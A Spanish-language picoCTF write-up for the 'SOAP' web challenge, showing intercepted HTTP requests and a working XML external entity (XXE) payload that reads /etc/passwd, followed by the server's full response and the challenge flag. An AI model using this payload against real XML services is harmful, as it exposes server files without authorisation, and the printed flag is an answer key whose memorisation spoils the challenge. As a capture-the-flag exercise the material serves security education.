---
title: SOAP
date: 2025-07-23 21:00:00 +0200
categories: [writeup, picoctf]
tags: [picoctf, explotación web, xml external injection]     
image:
    path: https://picoctf.org/img/logos/pico-mark.svg
    alt: PicoCTF
---
>SOAP
Author: Geoffrey Njogu
Description
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file? Web Portal
{: .prompt-tip }

Este reto comienza retándonos a leer el archivo **/etc/passwd**. En las pistas nos hablan de una inyección (XXE) XML External Entity Injections. 

``` html 
Computer Science

We have been ranked to be among the best universities in the world!

Carnegie Mellon University Africa Offers 3 masters degree programs.

PicoCTF A free Computer Security education program.

Upanzi Network an inititiave aimed at driving financial inclusion.
```

El contenido de la web muestra un título y tres universidades cada una acompañada de un botón **Details**
Capturo con Zap para ver que es lo que se envía cuando pulsas el botón de alguna de las universidades.

``` html
POST http://saturn.picoctf.net:55284/data HTTP/1.1
Host: saturn.picoctf.net:55284
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Referer: http://saturn.picoctf.net:55284/
Content-Type: application/xml
Content-Length: 61
Origin: http://saturn.picoctf.net:55284
Connection: keep-alive
Priority: u=0

<?xml version="1.0" encoding="UTF-8"?><data><ID>2</ID></data>
```
Lo que se envía es un tipo de datos XML, se supone que se puede intentar hacer una inyección (XXE) External Entity Injection. Busco de nuevo un payload y como no me encuentro de nuevo esta maravilla de repositorio con el ejemplo que necesito [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection). 

``` html
POST http://saturn.picoctf.net:55284/data HTTP/1.1
host: saturn.picoctf.net:55284
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Referer: http://saturn.picoctf.net:55284/
Content-Type: application/xml
content-length: 131
Origin: http://saturn.picoctf.net:55284
Connection: keep-alive
Priority: u=0

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data><ID>&xxe;</ID></data>
```
Y al funcionar la inyección nos muestra la flag.

``` shell 
HTTP/1.1 200 OK
Server: Werkzeug/2.3.6 Python/3.8.10
Date: Wed, 23 Jul 2025 20:55:55 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1023
Connection: close

Invalid ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
flask:x:999:999::/app:/bin/sh
picoctf:x:1001:picoCTF{XML_3xtern@l_3nt1t1ty_4dbeb2ed}
```

flag: **picoCTF{XML_3xtern@l_3nt1t1ty_4dbeb2ed}**

¿Que puedo decir? [https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)